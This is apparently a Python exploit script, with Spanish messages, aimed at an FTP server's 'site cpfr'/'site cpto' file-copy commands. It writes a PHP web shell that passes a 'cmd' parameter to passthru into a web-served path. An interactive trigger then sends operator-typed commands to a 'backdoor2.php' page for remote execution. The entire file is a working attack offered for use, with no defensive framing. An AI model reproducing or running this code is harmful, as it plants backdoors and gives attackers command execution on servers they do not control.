import socket 
import requests

class Exploit:

    def __init__(self, host, port, path):
        self.host = host
        self.port = port 
        self.path = path
        self.sock = None
    
    def connect(self):
        try:
            self.sock = socket.create_connection((self.host, self.port))
            self.sock.recv(1024)
            return True
        except Exception as e:
            print(f"Error al connectarse a {self.host} en el puerto {self.port}: {e}")
            return False
    
    def send_command(self, command):
        try:
            self.sock.sendall(command.encode('utf-8'))
            return self.sock.recv(1024).decode('utf-8')
        except Exception as e:
            print(f"Error al enviar el comando {command}: {e}")
            return None
        
    def exploit(self):
        payload = "<?php echo passthru($_GET['cmd']); ?>"
        self.send_command(f"site cpfr /proc/self/cmdline\n")
        self.send_command(f"site cpto /tmp/.{payload}\n")
        self.send_command(f"site cpfr /tmp/.{payload}\n")
        respuesta = self.send_command(f"site cpto {self.path}\n")
        if "Copy successful" in respuesta:
            print("La explotacion ha tenido exito")
        else:
            print(f"La explotacion ha fallado: {respuesta}")


    def trigger(self):
        try:
            command = input("Introduce el comando a ejecutar remoto:")
            response = requests.get(f"http://{self.host}/backdoor2.php?cmd={command}")
            if response.status_code == 200:
                return response.text
            return f"Error al ejecutar el exploit: {response.text}"
        except Exception as e:
            return f"Error en la solicitud HTTP: {e}"
            
    def run(self):
        if self.connect():
            self.exploit()